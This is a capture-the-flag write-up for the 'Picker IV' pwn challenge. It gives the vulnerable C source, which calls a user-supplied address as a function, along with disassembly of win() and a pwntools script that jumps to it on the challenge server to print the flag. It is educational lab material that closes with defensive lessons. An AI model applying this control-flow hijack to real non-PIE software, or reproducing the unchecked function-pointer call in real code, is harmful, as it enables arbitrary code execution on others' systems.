# CyLab — Picker IV

* **Platform:** CyLab Security Academy / picoCTF 2023 (Challenge ID: `403`)
* **Category:** Binary Exploitation (Pwn)
* **Difficulty:** Difficulty 2
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, objdump
* **Binary:** `picker-IV` (x86_64 ELF)

---

## TL;DR

The program prompts the user for a hexadecimal memory address, casts it directly into a function pointer, and calls it (`void (*foo)(void) = (void (*)())val; foo();`). Because Position Independent Executable (PIE) is disabled, the binary code section is loaded at fixed virtual addresses (`0x400000`). Inspecting the symbol table reveals a built-in `win()` function at `0x4012a1` that reads and outputs the flag. Providing `4012a1` triggers an immediate jump to `win()` and captures the flag.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file picker-IV
picker-IV: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=picker-IV
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key observations:
1. **No PIE:** Code segments are fixed at runtime at base `0x400000`.
2. **Direct Function Pointer Call:** The application takes user-supplied hexadecimal input and dereferences it as executable code.
3. **Symbol Table Intact:** Function symbols, including `win()`, are preserved.

---

## Static Analysis & Vulnerability

### 1. Source Code Review

```c
#include <stdio.h>
#include <stdlib.h>

void win() {
    FILE *f = fopen("flag.txt", "r");
    // Reads flag from file and prints to stdout
}

int main() {
    unsigned long val;
    printf("Enter the address in hex to jump to, excluding '0x': ");
    if (scanf("%lx", &val) != 1) {
        return 1;
    }
    void (*foo)(void) = (void (*)(void))val;
    foo();      // VULNERABILITY: Arbitrary indirect control-flow transfer
    return 0;
}
```

### 2. Locating `win()` in Binary

Inspecting symbols with `nm` or `objdump`:

```text
$ objdump -d picker-IV | grep -A 10 "<win>:"
00000000004012a1 <win>:
  4012a1:	f3 0f 1e fa          	endbr64
  4012a5:	55                   	push   rbp
  4012a6:	48 89 e5             	mov    rbp,rsp
  4012a9:	48 83 ec 10          	sub    rsp,0x10
  4012ad:	48 8d 3d 54 0d 00 00 	lea    rdi,[rip+0xd54]        # 402008 <_IO_stdin_used+0x8> ("flag.txt")
  4012b4:	48 8d 35 56 0d 00 00 	lea    rsi,[rip+0xd56]        # 402011 <_IO_stdin_used+0x11> ("r")
  4012bb:	e8 80 fd ff ff       	call   401040 <fopen@plt>
```

Address of `win()`: `0x4012a1`.

### 3. Execution Diagram

```text
                +------------------------------+
  User Input:   |         "4012a1\n"           |
                +------------------------------+
                               |
                               v
                       scanf("%lx", &val)
                               |
                               v
                     val = 0x004012a1
                               |
                               v
                  foo = (void (*)())0x4012a1
                               |
                               v
                           call foo()
                               |
                               +------------------------+
                               |                        |
                               v                        v
                    Indirect Call Target:        [ Normal Flow ]
                      win() at 0x4012a1            (Bypassed)
                               |
                               v
                      Read & Print flag.txt
```

---

## Dynamic Analysis & Exploitation Strategy

1. **Input Format Requirements:**
   The prompt asks for the address in hexadecimal without the leading `'0x'`: `f"{WIN:x}"` $\rightarrow$ `"4012a1"`.
2. **CET / IBT Considerations:**
   Although modern kernels and toolchains may compile with Indirect Branch Tracking (IBT), the `win()` function begins with `endbr64` (`f3 0f 1e fa`), rendering indirect calls fully compliant and preventing illegal instruction faults.
3. **Exploit Flow:**
   Send string `"4012a1"` and read all standard output to obtain the flag.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import re, sys
from pwn import *

context.log_level = "info"
HOST, PORT = "chatelaine.cylabacademy.net", 33434
WIN = 0x4012a1

def solve(io):
    io.recvuntil(b"to jump to")
    # Send address in lowercase hex without '0x'
    io.sendline(f"{WIN:x}".encode())
    data = io.recvall(timeout=3)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = process("./picker-IV") if len(sys.argv) > 1 and sys.argv[1] == "local" else remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to chatelaine.cylabacademy.net on port 33434: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 33434
```

---

## Key Takeaways & Lessons

1. **Unconstrained Function Pointer Dispatch:** Exposing low-level memory addressing to external input creates immediate arbitrary code execution when security features like PIE and Control Flow Guard / CFI are absent.
2. **Impact of Non-PIE Binaries:** When PIE is disabled, functions reside at fixed addresses in virtual memory, removing the need for ASLR leaks before redirecting execution.
3. **Indirect Call Target Validation:** Safe software design demands strict allow-listing or dispatch tables rather than directly jumping to unvetted memory addresses.
